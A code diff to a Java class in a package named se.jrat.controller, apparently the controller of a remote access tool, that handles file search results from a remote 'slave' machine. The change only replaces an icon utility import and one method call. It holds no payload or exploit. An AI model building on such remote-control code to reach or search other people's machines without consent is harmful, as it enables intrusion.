@@ -1,5 +1,7 @@
 package se.jrat.controller.packets.incoming;
 
+import iconlib.FileIconUtils;
+
 import java.io.DataInputStream;
 
 import javax.swing.ImageIcon;
@@ -7,7 +9,6 @@ import javax.swing.ImageIcon;
 import se.jrat.controller.Slave;
 import se.jrat.controller.ui.frames.FrameRemoteFiles;
 import se.jrat.controller.ui.panels.PanelSearchFiles;
-import se.jrat.controller.utils.IconUtils;
 
 public class Packet37SearchResult extends AbstractIncomingPacket {
 
@@ -20,7 +21,7 @@ public class Packet37SearchResult extends AbstractIncomingPacket {
 		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
 		if (frame != null) {
 			PanelSearchFiles panel = frame.getSearchPanel();
-			panel.getRenderer().icons.put(path, (ImageIcon) IconUtils.getFileIconFromExtension(name, dir));
+			panel.getRenderer().icons.put(path, (ImageIcon) FileIconUtils.getIconFromExtension(name, dir));
 			panel.getModel().addRow(new Object[] { path, name });
 		}
 	}
